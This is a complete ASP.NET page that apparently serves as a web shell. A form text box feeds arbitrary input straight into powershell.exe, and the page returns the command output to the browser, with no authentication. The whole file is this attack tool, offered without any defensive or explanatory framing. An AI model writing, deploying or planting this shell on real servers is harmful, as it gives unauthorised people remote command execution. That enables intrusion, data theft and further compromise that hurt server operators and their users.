<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void loadpage(object sender, EventArgs e)
{
}

string execmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "powershell.exe";
psi.Arguments = "-command \""+arg+"\"";
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader st = p.StandardOutput;
string s = st.ReadToEnd();
st.Close();
return s;
}

void clickstuff(object sender, System.EventArgs s)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(execmd(thing.Text)));
Response.Write("</pre>");
}
</script>

<HTML>
<head>
lol
</head>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="thing" runat="server" Width="800px" Height="100px"></asp:TextBox>
<asp:Button id="other" Text="go" runat="server" OnClick="clickstuff" Height="40px" Width="40px"></asp:Button>
</form>
</body>

</HTML>